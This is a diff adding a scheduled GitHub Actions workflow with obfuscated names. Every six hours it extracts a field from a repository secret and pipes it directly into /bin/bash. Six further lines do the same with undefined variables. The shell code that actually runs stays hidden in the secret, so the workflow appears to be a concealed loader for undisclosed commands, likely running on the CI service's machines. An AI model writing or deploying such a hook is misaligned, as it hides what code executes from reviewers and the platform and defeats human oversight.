@@ -1,0 +1,24 @@
+name: xiaoyuduanjue
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiaoyuduanjue
+        env:
+          fs7557: ${{ secrets.fs7557 }}
+        run: |
+          echo $fs7557 | jq -r .cahik60214 | /bin/bash
+          echo $aoxvp5 | jq -r .zlqs43291 | /bin/bash
+          echo $fp13034 | jq -r .kx31 | /bin/bash
+          echo $liydq37189 | jq -r .kei94356 | /bin/bash
+          echo $rwwlf53 | jq -r .odnxv5586 | /bin/bash
+          echo $jcdfw2666 | jq -r .u3449 | /bin/bash
+          echo $is51 | jq -r .vtlbp687 | /bin/bash
+
